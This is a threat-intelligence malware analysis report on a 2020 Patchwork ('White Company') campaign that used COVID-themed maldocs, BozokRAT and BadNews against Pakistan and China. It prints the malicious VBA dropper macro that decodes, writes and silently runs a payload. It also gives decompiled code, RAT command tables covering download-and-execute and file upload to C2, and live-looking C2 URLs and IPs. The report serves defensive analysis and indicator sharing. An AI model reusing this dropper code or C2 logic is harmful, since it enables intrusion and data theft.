## White Company, copycat company of Patchwork (or just aka)
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Yara rules](#Yara)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [References](#References)

<h2>Malware analysis<a name="Malware-analysis"></a></h2>
<h4>The initial vector comes from a maldoc probably send by Spear-phishing campaign.This content a macro witch use the Image1_MouseMove method for performing the actions when only the victim goes over the cover picture, this limits the execution of the payload on the sandbox.This executes two methods, one for the drops and launch the lure to the victim and for executing the implant.</h4>

```vb
Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    LaunchDoc
    DropPayloads
End Sub
```

<h4>The first method concatenate some functions for getting the encoded lure document. After this, this decodes the encoded data and pushes it on the Temp folder. Finally, initialize a Word application for open the lure to the victim.</h4>

```vb

Public Function LaunchDoc() As Variant
	Set wshell = CreateObject("WScript.Shell").Environment("PROCESS")
	Dim PathDoc
	Temp_Folder = wshell("TEMP")
	Set ScriptingObj = CreateObject("Scripting.FileSystemObject")
	PathDoc = Temp_Folder & "\Covid19_Guidelines.docx"
	DataDoc = DataDoc & doc1
	DataDoc = DataDoc & doc2
	Set ObjScr = ScriptingObj.createTextFile(PathDoc, True)
	ObjScr.Write Decode(DataDoc)
	ObjScr.Close
	Set WordAPP = GetObject(, "Word.Application")
	WordAPP.Visible = True
	'WordAPP.Documents.Close (wdDoNotSaveChanges)
	WordAPP.Documents.Open PathDoc
	Set WordAPP = Nothing
End Function
Function doc1()
	DataDoc = DataDoc & "UEsDBBQABgAIAAAAIQD5QALuywEAAOAIAAAT"
    [...]
	DataDoc = DataDoc & "AFRKUYq8nY0p051JcsFdk"
	doc1 = DataDoc
End Function
Function doc2()
	DataDoc = DataDoc & "Y6UR69PK2ta"
    [...]
	DataDoc = DataDoc & "AAAAABkAGQBuBgAAKLwAAAAA"
	doc2 = DataDoc
End Function
```

<h4>The algorithm used for decode the lure and the payload, use multiple character replacement and extraction, bitwise operations and convert each characters for getting the payload.</h4>

```vb
Function Decode(ByVal DataArg)
  Const base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim lim, result, i
  DataArg = Replace(DataArg, vbCrLf, "")
  DataArg = Replace(DataArg, vbTab, "")
  DataArg = Replace(DataArg, " ", "")
  lim = Len(DataArg)
  If lim Mod 4 <> 0 Then
    Err.Raise 1, "DpwH56HIF7", "Bad base string."
    Exit Function
  End If
  For i = 1 To lim Step 4
    Dim val, j, t, offset, tmp, c
    val = 3
    tmp = 0
    For j = 0 To 3
      t = Mid(DataArg, i + j, 1)
      If t = "=" Then
        val = val - 1
        offset = 0
      Else
        offset = InStr(1, base, t, vbBinaryCompare) - 1
      End If
      If offset = -1 Then
        Err.Raise 2, "DpwH56HIF7", "Bad character In base string."
        Exit Function
      End If
      tmp = 64 * tmp + offset
    Next
    tmp = Hex(tmp)
    tmp = String(6 - Len(tmp), "0") & tmp
    c = Chr(CByte("&H" & Mid(tmp, 1, 2))) +  Chr(CByte("&H" & Mid(tmp, 3, 2))) +  Chr(CByte("&H" & Mid(tmp, 5, 2)))
    result = result & Left(c, val)
  Next
  Decode = result
End Function
```

<h4>The next functions are used for parse, decode the encoded data of the payload to execute and read the file writes on the disk.</h4>

```vb
Function ReadStream(Object_input)
	  Dim StreamObj
	  Set StreamObj = CreateObject("ADODB.Stream")
	  StreamObj.Type = 1
	  StreamObj.Open
	  StreamObj.LoadFromFile Object_input
	  ReadStream = StreamObj.Read
	  Set StreamObj = Nothing
End Function
Function Parse(arg) ' Fix 
	Dim tmp, i, result
	For i = 1 To Len(arg) Step 32
		tmp = Mid(arg, i, 32)
		result = result & DecodeString(tmp, "ludos")
	Next
	Parse = result
End Function
Function DecodeString(arg1, arg2)
	Dim lim1, c, lim2, i, result, tmp
	result = ""
	lim1 = Len(arg2)
	c = 1
	lim2 = Len(arg1)
	arg1 = StrReverse(arg1)
	For i = lim2 To 1 Step -1
	  tmp = Asc(Mid(arg1, i, 1)) - Asc(Mid(arg2, c, 1)) + 256
	  result = result & Chr(tmp Mod 256)
	  c = c + 1
	  If c > lim1 Then c = 1
	Next
	result = StrReverse(result)
	DecodeString = result
End Function
```

<h4>The following functions, convert in binary format the bytes and string pushed as arguments.</h4>

```vb
Function MultiByteToBinary(MultiByte)
	Dim RS, LMultiByte, Binary
	Const adLongVarBinary = 205
	Set RS = CreateObject("ADODB.Recordset")
	LMultiByte = LenB(MultiByte)
	If LMultiByte > 0 Then
	RS.Fields.Append "mBinary", adLongVarBinary, LMultiByte
	RS.Open
	RS.AddNew
	  RS("mBinary").AppendChunk Binary & ChrB(0)
	RS.Update
	Binary = RS("mBinary").GetChunk(LMultiByte)
	  End If
	  MultiByteToBinary = Binary
End Function
Function MultiByteToBinary(arg)
	Dim Binary 
	If VarType(arg) = 8 Then Binary = MultiByteToBinary(arg) Else Binary = arg ' if 8 -> string 
	Dim AdodbObj, l
	Const c = 201
	Set AdodbObj = CreateObject("ADODB.Recordset")
	l = LenB(MultiByte)
	If l > 0 Then
	AdodbObj.Fields.Append "mBinary", c, l
	AdodbObj.Open
	AdodbObj.AddNew
	  AdodbObj("mBinary").AppendChunk Binary 
	AdodbObj.Update
	MultiByteToBinary = AdodbObj("mBinary")
	Else
		MultiByteToBinary = ""
End If
End Function
```

<h4>This code can be found on Visual Basic forums which give functions ready to use.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Code.png"></img></center>
<h4>The second function called by the mouseover of the image content lot of comments and will be analysed later. Like the lure, lot of functions are concate for get the string (implant), this is parsed with the algorithms and decoded for write and execute the payload.This delete the lure file on the disk too.</h4>

```vb
Sub sampledel()
    On Error Resume Next
    Dim wor As Word.Application
    Set wor = GetObject(, "Word.Application")
    wor.Documents("Covid19_Guidelines.doc").Close
End Sub
Public Function DropPayloads() As Variant ' version without comments
    Set sh = CreateObject("WScript.Shell")
    Dim wshell, Path_Payload, Path_Unused, Path_Base, Path_SideDLL, Path_legit, Temp_Folder, Path_APP, Appdata_Folder, ScriptingObj, ShObj
    Set wshell = CreateObject("WScript.Shell").Environment("PROCESS")
    Temp_Folder = wshell("TEMP")
    Set ScriptingObj = CreateObject("Scripting.FileSystemObject")
    Path_Payload = Temp_Folder & "\micro"
    Payload = Payload & mi1
    Payload = Payload & mi2
    Payload = Payload & mi3
    Payload = Payload & mi4
    Set ScObject = ScriptingObj.createTextFile(Path_Payload, True)
    ScObject.Write Decode(Payload)
    ScObject.Close
    Appdata_Folder = wshell("APPDATA")
    Appdata_Folder = Appdata_Folder & "\Microsoft"
    Path_APP = Appdata_Folder & "\MicroScMgmt.exe"
    If Not ScriptingObj.FileExists(Path_APP) Then
        WriteFile MultiByteToBinary(ReadStream(Path_Payload)), Path_APP
    End If
    If ScriptingObj.FileExists(Path_Payload) Then
        ScriptingObj.DeleteFile Path_Payload
    End If
    Set ShObj = CreateObject("WScript.shell")
    ShObj.Run Path_APP, 0, False
    Set ShObj = Nothing
    sampledel
End Function
```

<h4>As first, the RAT verify if this possible to join legitimate domain for be ensure to be possible to contact the C2.If the result is successful, this perform the rest of the operations.</h4> 

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/CheckConnect.png"></img></center>

<h4>The implant checks if this on a sandbox or on a VM by the debugger. This check after on the list on the process, this verifies is the AV is present and give a code.The process is based on recognition in modules (exe, dlls) mounted in memories by the process or by its process name.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/CheckPresenceSoftware.png"></img></center>

<h4>This is the list of the internal code. This is used for performing some evading actions for limit the detection.</h4>

<center>

|Antivirus|Code|
| :------------- | :----------: |
|ESET Smart Security|1|
|AVG|2|
|Bitdefender|3|
|Trend Micro|4|
|Norton|5|
|G-Data Security|6|
|Kaspersky AntiVirus|7|
|Avast|8|
|Panda Cloud Antivirus|9|
|Quick Heal Technologies|10|
|eScan Antivirus|11|
|Check Point ZoneAlarm|12|
|Total Defense|13|
|Microsoft MSE|14|
|F-Secure|15|
|K7TotalSecurity|16|
|McAfee|17|

</center>

<h4>This pushes a persistence in function of the AV check.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/Actions.png"></img></center>

<h4>Some commands are hardcoded as follows :</h4>

<table style =" margin-left: auto; margin-right: auto;">
    <tr>
        <th>Code (Hex)</th>
        <th>Command</th>
    </tr>
    <tr>
        <th>3</th>
        <th style="text-align: left">Return the type of the disk asked</th>
    </tr>
    <tr>
        <th>4</th>
        <th style="text-align: left">Get a list of the files of a location given in argument</th>
    </tr>
    <tr>
        <th>9</th>
        <th style="text-align: left">Execute a file in cmd windows (hidden params)</th>
    </tr>	
    <tr>
        <th>A</th>
        <th style="text-align: left">Execute a file (shell32 call)</th>
    </tr>	
    <tr>
        <th>D</th>
        <th style="text-align: left">Delete the choosen file</th>
    </tr>	
    <tr>
        <th>10</th>
        <th style="text-align: left">Copies, moves, renames, or deletes a file system object (legagy mode -> XP)</th>
    </tr>
    <tr>
        <th>16</th>
        <th style="text-align: left">Move the chossen file</th>
    </tr>
    <tr>
        <th>19</th>
        <th style="text-align: left">Upload a file to the compromissed system</th>
    </tr>
    <tr>
        <th>21</th>
        <th style="text-align: left">Send the list of the process running to the system</th>
    </tr>
    <tr>
        <th>25</th>
        <th style="text-align: left">Kill a designed process</th>
    </tr>
    <tr>
        <th>5C</th>
        <th style="text-align: left">Decrypt the additionnal module for the strealer and remote connection options</th>
    </tr>
    <tr>
        <th>7C</th>
        <th style="text-align: left">Download a file and execute it on the system</th>
    </tr>	
</table>

<h4>This obfuscates the sensible strings with two algorithms :</h4>
<ul>
<li><h4>The first one uses the subtraction of twice the same string, which is equivalent to adding to this string with 0xFF (bitwise operation) for getting the decoded string, This is only used for the dll to load.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/SubLib.png"></img></center>
</li>
<li><h4>The second uses a xor to decode the data. This uses the 0x3 and 0xA keys to get the methods and sensible strings.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/XOR.png"></img></center>
</li>
</ul>

<h4>That interesting to note that the first algorithm have been used by the Iron group in reusing the leak of the HackingTeam’s “core” library. Probably added later by the code knowing that the RAT code can be readily available and that the attacker likes to use tools and techniques from Chinese groups. This explains the detection of the strings also used by Iron Tiger group for theirs malwares.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/matchalgo2.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/matchalgo1.png"></img></center>

<h4>We can see the ID, the password used for the communications and the version of the BozokRAT (1.4.1).</h4>

```
String that the configuration from memory dump (username, payload, port, IP, reference...)

TestServer|4NCwiOVL7rfHl|server.exe||ext.dat|mypass|0|0|0|0|0|4040|185.157.78.135*|0|

From dump PCAP (debug):

zUSER-PC|admin|TestServer|ENU|5|141|0|2|mypass|40|Libraries

[LengthofData]Hostname|Username|ID|LocaleInfo|OSVersion|RATVersion|0|2|ConnectionPassword|IdleTime|ActiveWindowName
```

<h4>This RAT, that used by the APT group called admin@338 who attacked between 2013 and 2016 in focusing financially, economic, and trade policy sectors. Now, this RAT can found easily on the web and markets.</h4>

<h4>But on the comments of the macro, we can note that the payload reuse the same algorithm that that use Patchwork in 2016 (which targeted China) for drops the Badnews backdoor on the system.That used the vulnerable legit dll for load the Badnews backdoor by side-loading method. This don't have been uploaded on any sandbox platform and don't have a public reference that this IOC that used on an operation in the past (early June 2020). However, a reference to TTPs and different hash can be found on a report of and attack against china by Patchwork at the same time that the macro algorithm in 2016.</h4>

```vb
Public Function DropPayloads() As Variant
    Set sh = CreateObject("WScript.Shell")
    Dim wshell, Path_Payload, Path_Unused, Path_Base, Path_SideDLL, Path_legit, Temp_Folder, Path_APP, Appdata_Folder, ScriptingObj, ShObj
    Set wshell = CreateObject("WScript.Shell").Environment("PROCESS")
    Temp_Folder = wshell("TEMP")
    Set ScriptingObj = CreateObject("Scripting.FileSystemObject")
    Path_Payload = Temp_Folder & "\micro"
    'Path_Unused = Temp_Folder & "\jl"
    'Path_Base = Temp_Folder & "\ms"
    'BasePayload = BasePayload & ms1 -> msvcr71.dll
    'BasePayload = BasePayload & ms2
    'BasePayload = BasePayload & ms3
    'BasePayload = BasePayload & ms4
    'BasePayload = BasePayload & ms5
    'BasePayload = BasePayload & ms6
    'BasePayload = BasePayload & ms7
    'BasePayload = BasePayload & ms8
    'BasePayload = BasePayload & ms9
    'BasePayload = BasePayload & ms10
    'BasePayload = BasePayload & ms11
    'UnusedPayload = UnusedPayload & jl1 -> Badnews Backdoor
    'UnusedPayload = UnusedPayload & jl2
    'UnusedPayload = UnusedPayload & jl3
    'UnusedPayload = UnusedPayload & jl4
    'UnusedPayload = UnusedPayload & jl5
    Payload = Payload & mi1
    Payload = Payload & mi2
    Payload = Payload & mi3
    Payload = Payload & mi4
    Set ScObject = ScriptingObj.createTextFile(Path_Payload, True)
    ScObject.Write Decode(Payload)
    ScObject.Close
    'Set ScObject = ScriptingObj.createTextFile(Path_Unused, True)
    'ScObject.Write Decode(UnusedPayload)
    'ScObject.Close
    'Set ScObject = ScriptingObj.createTextFile(Path_Base, True)
    'ScObject.Write Decode(BasePayload)
    'ScObject.Close
    Appdata_Folder = wshell("APPDATA")
    Appdata_Folder = Appdata_Folder & "\Microsoft"
    Path_APP = Appdata_Folder & "\MicroScMgmt.exe"
    'Path_SideDLL = Appdata_Folder & "\jli.dll"
    'Path_legit = Appdata_Folder & "\msvcr71.dll"
    If Not ScriptingObj.FileExists(Path_APP) Then
        WriteFile MultiByteToBinary(ReadStream(Path_Payload)), Path_APP
    End If
    'If Not ScriptingObj.FileExists(Path_SideDLL) Then
        'WriteFile MultiByteToBinary(ReadStream(Path_Unused)), Path_SideDLL
    'End If
    'If Not ScriptingObj.FileExists(Path_legit) Then
        'WriteFile MultiByteToBinary(ReadStream(Path_Base)), Path_legit
    'End If
    If ScriptingObj.FileExists(Path_Payload) Then
        ScriptingObj.DeleteFile Path_Payload
    End If
    'If ScriptingObj.FileExists(Path_Unused) Then
        'ScriptingObj.DeleteFile Path_Unused
    'End If
    'If ScriptingObj.FileExists(Path_Base) Then
        'ScriptingObj.DeleteFile Path_Base
    'End If
    Set ShObj = CreateObject("WScript.shell")
    ShObj.Run Path_APP, 0, False
    Set ShObj = Nothing
    sampledel
End Function
```

<h4>Once check the connectivity with wikipedia domain for ensure to be communicating to the C2, this loads serval mirrors sites for getting the configuration and have the C2 to contact.</h4>

```asm
0x10005203 mov dword [var_8h], eax
0x1000520a mov eax, dword [arg_8h]
0x1000520d push esi
0x1000520e mov esi, dword [sym.imp.KERNEL32.dll_lstrcpyA] ; 0x1001b0a8 ; "*%\x02"
0x10005214 mov dword [var_5b4h], eax
0x10005218 mov eax, dword [arg_ch]
0x1000521b push edi
0x1000521c mov dword [var_5c0h], eax
0x10005220 lea eax, [var_3cch]
0x10005227 push 0x10020964    ; http://feed43.com/6021628058817160.xml
0x1000522c push eax
0x1000522d mov dword [var_5ach], edx
0x10005231 mov dword [var_5c4h], ecx
0x10005235 mov dword [var_5a4h], 0
0x1000523d call esi
0x1000523f push str.iuuqt_00sbx_hjuivcvtfsdpoufou_dpn0qfuspw2bmfy_foefs0sfbenf0nbtufs0ynm_ynm ; 0x100209c0 ; "iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0qfuspw2bmfy{foefs0sfbenf0nbtufs0ynm/ynm"
0x10005244 lea eax, [var_384h] ; https://raw.githubusercontent.com/petrov1alexzender/readme/master/xml.xml
0x1000524b push eax
0x1000524c call esi
0x1000524e push str.iuuqt_00dpggffnftnbsjtjohnpnfout_xpseqsftt_dpn0 ; 0x1002098c ; "iuuqt;00dpggffnftnbsjtjohnpnfout/xpseqsftt/dpn0"
0x10005253 lea eax, [var_29ch] ; https://coffeemesmarisingmoments.wordpress.com/
0x1000525a push eax
0x1000525b call esi
0x1000525d push str.iuuq_00tipqteftujobujpo_xffcmz_dpn0dpoubdu_iunm ; 0x10020a0c ; "iuuq;00tipqteftujobujpo/xffcmz/dpn0dpoubdu/iunm"
0x10005262 lea eax, [var_2a4h] ; http://shopsdestination.weebly.com/contact.html
0x10005269 push eax
0x1000526a call esi
0x1000526c movaps xmm0, xmmword [0x10021230]
0x10005273 xor eax, eax
```
<h4>Here from the github account, reuse the structure from rapidfeeds (reuse form a post in 2015, so same URL since 2015 ?).</h4>

```html
<rss xmlns:blogChannel="http://backend.userland.com/blogChannelModule" version="2.0">
<channel>
<title>good</title>
<link>http://feeds.rapidfeeds.com/79167/</link>
<atom:link xmlns:atom="http://www.w3.org/2005/Atom" rel="via" href="http://feeds.rapidfeeds.com/79167/" type="application/rss+xml"/>
<atom:link xmlns:atom="http://www.w3.org/2005/Atom" rel="self" href="http://feeds.rapidfeeds.com/79167/" type="application/rss+xml"/>
<description>
<![CDATA[
{{MmVhZGFkMmQ2NGM2YzYwNTI0ODVlNjY1MDRlNjA1MjV [...] 2ZDBmNGRlZjQ1YTVlZjRkYWZlNjJkMmUyZDIz}}
]]>
</description>
<pubDate>Tue, 21 Jul 2015 05:03:09 EST</pubDate>
<docs>http://backend.userland.com/rss</docs>
<generator>RapidFeeds v2.0 -- http://www.rapidfeeds.com</generator>
<language>en</language>
</channel>
</rss>
```

<h4>The mirrors have the same data and have the same date of the edition (4 May 2017).</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Badnews/URL.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Badnews/Index.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Badnews/Mirror.png"></img></center>

<h4>Once the content of the page has been parsed (search by pattern {{xxx}}), this decode from base64, performs a Xor operation (0x23) and rotate left by 3 bits.</h4>

```asm
 al <<= 4;
 al += cl;
 al ^= 0x23;
 al = rotate_left8 (al, 3);
 *((esi + ebx)) = al;
 esi++;
```

<h4>Of course, like the payload is old, the C2 don't response to a solicitation.</h4>

```
C:\Users\Elisa\Invest\WhiteCompany> DecodeBadNewsC2.py MmVhZGFkMmQ2NGM2YzYwNTI0ODVlNjY1MDRlNjA1MjV [...] 2ZDBmNGRlZjQ1YTVlZjRkYWZlNjJkMmUyZDIz
Decrypted URL C2 : http://185.29.10.115/00fc577294c34e0b28ad28394359/L034asgf3fdsa3g4/d3423qrasf34fsd.php
```

<h4>We can note that BadNews use the same substitution of strings that BozokRAT for loads the dlls already taken from the HackingTeam’s leak in 2017. It's therefore not excluded that the coders of BadNews have reused this leaks for the creation of custom backdoor.</h4>


<h3>Same group ?</h3>
<h4>An incident release revealed spear-phishing with fake e-mail account of the presidential palace to the Taiwan organizations (21 May 2020). Few details are available, difficult to said more about it with the release press.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Articles/1.png"></img></center>

<h4>The IP was used as delivery for the second stage of the infection for one of two samples. Unfortunately, the next stage can't respond for getting it. Interesting detail, feed reference come again as "rss feed".</h4>

```asm
0x00403286 push   str.app_rss.asp ; 0x41a7ec ; u"/app/rss.asp" ; int32_t arg_4h
0x0040328b lea    ecx, [ebp - 0xa0]

0x00403299 lea    eax, [ebp - 0xa0]
0x0040329f lea    edx, [ebp - 0x70]
0x004032a2 lea    ecx, [ebp - 0x88]
0x004032a8 call   ConcatenateC2Domain ;  http://office.phonectrl.com/app/rss.asp
```

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Pushdo/LoadConnect.png"></img></center>

<h4>We can see all the references on this graph done on VT by vchen user (cf links for map), the spear-phishing give a link to a zip with the executables with a simple C2 as final point.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/VT.png"></img></center>

<h4>By this help of this graph, another BozokRAT sample can be found (21ee9bb5f2444fdf72d55109b7f823d5a5cd43d60aa1fb653764e2e5d20f2080), we can note that have the same configuration pushed in memory for connect to the C2.</h4>

```
TestServer|4NCwiOVL7rfHl|server.exe||ext.dat|mypass|0|0|0|0|0|4040|185.157.78.135*|0|
```

<h4>Difficult to confirm if this sample is from the spear-phishing operation or on the Patchwork operation only but this is enough interesting to underline it.</h4>

<h3>Common objectives</h3>

<h4>In same time, the Indian APT Patchwork group targetted Pakistan and China by maldocs and waterhole site for theirs operations.</h4>

<h4>The first maldoc use the CVE-2015-2545 vulnerability that alllow to run arbitrary code. The EFS script executed use a second vunerablity, the CVE-2017-0261 (EPS "restore" Use-After-Free) for load a shellcode in memory.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/EFS.png"></img></center>

<h4>The EPS script contains multiple PE file and shellcode, the shellcode loaded performs a Xor operation for decode the payload and execute it.</h4>

```c++
do
{
    if(*data)
        *data ^= XorValue;
        lim -= 4;
        ++data; 
}
while(lim >= 4);
```

<h4>This checks the permissions rights, if needed it, this decrypts an dll to allow to elevated permissions. This drops the PE files and executes them.</h4>

```c++
// reversed order of list of paths
// -> %programdata%Microsoft\\DeviceSync\\MSBuild.exe
v8="огр%";
v9='marg';
v10='atad';
v11='iM\\%';
v12='sorc';
v13='Vito';
v14='iveD';
v15='ySec';
v16='M\\cn';
v17='iuBS';
v18='e.dl';
v19='ex';
if（！ sub_6E7(a1+90736,&v8,edio,a2,(a1+90736),167936,&v8,a4) )
return 0;
// -> %programdata%Microsoft\\DeviceSync\\vmtools.dll
v5='orp%';
v6='marg';
v7='atad';
v8='iM\\%'
v9='sorc';
v10='Ntfo';
v11='iveD';
v12='ySec';
v13='v\\cn';
v14='ootm';
v15='d.sl';
v16='11';
if（！ sub_6E7(al+258672,&v5,edio,a2,(al+258672),94208,&v5,a4) )
return 0;
// -> %programdata%Microsoft\\DeviceSync\\VMwareCplLauncher.exe
v5='огр%';
v6='marg';
v7='atad';
v8='imux';
v9='sorc';
v10='\\tfo';
v11='iveD';
v12="ysec";
v13='VNcn';
v14='rawM';
v15='1pCe';
v16='nuaL';
v17='rehc';
v18='exe.';
LOWORD(v19)=0;
result = sub_6e7(al+0x10000,&v5,edi0,a2,(a1+0x10000),25200,&v5,a4);
if (!result)
    return 0;
return result;
```

```c++
vl=_wgetenv(L"ProgramData");
sub_100026E0(v1,&v75,wcslen(v1));
v80=0;
sub_10002600(L"\Microsoft\\DeviceSync\MSBuild.exe",&v75,0x21u);
ppv=0;
```

<h4>This performs the creation of one mutex for ensure to run one unique instance in memory (check by error code) and collect the system informations.</h4>

```c++
for ( i = 0; i < lstrlenA(&arg); ++i )
    --*(&arg + i);
v1 = GetModuleHandleA(&arg);
CreateMutex = GetProcAddress(v1, aCreatemutexa);
strcpy(&v232, "asssszzjddddddjjjzzxccssda"); // -> Mutex name
dword_423B14 = CreateMutex;
(CreateMutex) (0, 1, &v232);
if ( GetLastError() == 183 ) // -> Cannot create a file when that file already exists
    ExitProcess(0);
memset(&v217, 0, 0x63u);

memset(&VersionInformation, 0, 0x11Cu);
VersionInformation.dwOSVersionInfoSize = 0x11C;
GetVersionExW(&VersionInformation);
v233 = 0;
memset(&v234, 0, 0xC7u);
v237 = 0;
memset(&v238, 0, 0x63u);
v78 = 0;
v79 = 0;
v73 = 0x75;
v74 = Øx75;
v75 = 0x69;
v76 = 0x64;
V77 = 0x3D;
LOBYTE(v78) = 0;
v9 = 0;
do
vie = *(&v73 + v9);
*(&v233 + v9++) = v10;
while ( v10 );
```

<h4>Finally send a pulse to C2 and wait for the orders to execute.</h4>

```c++
strcat(v7, "&crc=e3a6");
strcpy(&v103, "//e3e7e71a0b28b5e96cc492e636722f73//4sVKAOvu3D//BDYot0NxyG.php"); // -> add to URL C2(altered.twilightparadox.com) 
v41 = *(v39 + 1);
v10 = SendPulse(&v103, v7, v41);
v115 = 0;
memset(&v116, 0, Øx3E7u);
```

<h4>A condition switch checks the order of the C2, this can done as follows:</h4>


<table style =" margin-left: auto; margin-right: auto;">
    <tr>
        <th>Code (Hex)</th>
        <th>Command</th>
    </tr>
    <tr>
        <th>0</th>
        <th style="text-align: left">Kill switch</th>
    </tr>
    <tr>
        <th>5</th>
        <th style="text-align: left">Upload the files choosen by the attacker to the C2</th>
    </tr>
    <tr>
        <th>8</th>
        <th style="text-align: left">Download a file and execute it (from others samples, a keylogger ?)</th>
    </tr>
     <tr>
        <th>13</th>
        <th style="text-align: left">Upload form an hardcoded list of types of files to the C2 {".txt",".doc",".xls",".xlsx",".docx",".xls",".ppt",".pptx", ".pdf"}</th>
    </tr>
    <tr>
        <th>23</th>
        <th style="text-align: left">Take a screenshot</th>
    </tr>
     <tr>
        <th>33</th>
        <th style="text-align: left">Download from an URL and execute it.</th>
    </tr>
</table>

<h4>The last sample is from an iframe inserted from the homepage of the website hmfs in redirecting to dailypakistan.info for check if the victim is interesting and launch the PE file.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Docs/Website.png"></img></center>

<h4>This usurps the graphic style and the name of a Java installer, this drops a PE file and execute it.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/BozokRAT/SendToC2.png"></img></center>

<h4>This payload is the same that the BozoRAT that used by the sample spotted as White Company. With all the matches, this allows to show a correlation between Patchwork, and the white Company are the same, Patchwork.</h4>

<h4>We also note that Patchwork have used BozokRAT for theirs operations.</h4>

<h4>This campaign focuses Pakistan due to the cooperation mechanism between China and Pakistan for the response to the COVID-19 event, this alludes to Zhao Lijian's speech at a press conference on Chinese post COVID-19 policy issues with economic and strategic alliances.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Articles/2.png"></img></center>
<h4>These guidelines, expressed in more detail in the press, have been reproduced in the document weaponised with the macro using this theme.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Docs/BannerCOVID.png"></img></center>
<h4>In the same way, the law on security, the data draft had been voted and put it in public early July 2020, the necessities of the implementation for security measures in China were used by usurping the ministry of interior of Pakistan via the FIA.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Articles/3.png"></img></center>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Docs/BannerNat.png"></img></center>

<h4>Recently, the loss of twenty Indian soldiers in the clash with China was the worst clash in the past 60 years (June 16, 2020) in a region heavily tense with alliances between Pakistan and China.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Articles/4.png"></img></center>
<h4>The Belt and Road Initiative, formerly known as One Belt One Road, is a global infrastructure development strategy adopted by the Chinese government in 2013 to replace the current Silk Road causing problems between Pakistan, India and China. This could add tension by taking into account the share in GDP that brings the Silk Road to India. In addition, the fact that China receives a boost in the progress of this project with the repurchase of almost all the shares in Chinese companies by the COVID-19 event and in the expansion of its exclusive economic zone (EEZ) for maritime trade extends up to 370.4 km around each new artificial island created by China.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Articles/silk.png"></img></center>

<h4>This could also be a valid reason for the phishing incident in Taiwan, given the current news.</h4>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/Resume.png"></img></center>


<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h4>This process graph represent the cyber kill chain used by the attacker.</h4>
<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/Patchwork/2020-07-23/Pictures/cyberkill.png"></img></center>

<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h4> The IOC can be exported in <a href="https://otx.alienvault.com/pulse/5f146d049f5652cddfc6fd31">CSV</a></h4>
<h4>Taiwan incident : <a href="https://otx.alienvault.com/pulse/5ec7ff4ec67d6aca23b7c350">here</a></h4>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

<center>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
